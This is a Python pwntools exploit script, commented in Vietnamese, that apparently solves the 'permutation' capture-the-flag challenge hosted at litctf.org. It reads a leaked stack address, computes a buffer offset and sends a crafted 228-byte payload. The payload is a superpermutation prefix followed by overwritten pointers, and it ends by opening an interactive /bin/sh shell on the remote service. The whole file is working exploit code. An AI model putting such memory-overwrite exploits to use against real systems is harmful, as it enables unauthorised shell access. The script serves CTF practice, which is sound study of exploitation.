from pwn import *
import itertools

context.binary = './permutation'
# context.log_level = 'debug'

# p = process(context.binary.path)
p = remote("litctf.org", 31780)

# Leak: "ptrs[0] = 0x...."  (chính là &a[0])
line = p.recvline_contains(b'ptrs[0] = ')
a_addr = int(line.split(b'=')[1].strip(), 16)

# Layout tĩnh từ ELF: a - vuln = 0xE0
vuln_addr = a_addr - 0xE0

# ---- Superpermutation độ dài 33 cho alphabet {0,1,2,3} ----
S33_str = "123412314231243121342132413214321"  # len=33
m = {ord('1'):0, ord('2'):1, ord('3'):2, ord('4'):3}
S33 = bytes(m[ord(c)] for c in S33_str)
S32 = S33[:-1]  # 32 byte -> ghi đè vuln
assert len(S32) == 32

def is_perm4(b):
    return len(b) == 4 and set(b) == {0,1,2,3}

# Lấy 23 cửa sổ hoán vị không trùng trong S32
seen = {}
order_offsets = []
for i in range(len(S32) - 3):
    w = bytes(S32[i:i+4])
    if is_perm4(w) and w not in seen:
        seen[w] = i
        order_offsets.append(i)
assert len(seen) == 23, f"found {len(seen)} perms in S32, need 23"

# Hoán vị còn thiếu -> ghi vào a[0..3]
all_perms = set(bytes(p) for p in itertools.permutations(range(4)))
missing = next(iter(all_perms - set(seen.keys())))

# ---- Build payload: vuln(32) + ptrs(24*8=192) + a = 228 ----
payload  = S32
payload += b''.join(p64(vuln_addr + off) for off in order_offsets)  # 23 con trỏ vào vuln
payload += p64(a_addr)                                              # con trỏ thứ 24 vào a
payload += missing                                                  # ghi đè a[0..3]
assert len(payload) == 0xE4

# GỬI ĐỦ 228 BYTE, KHÔNG shutdown stdin!
p.send(payload)

# Nếu pass -> win() -> /bin/sh (stdin vẫn mở nên shell sống)
p.interactive()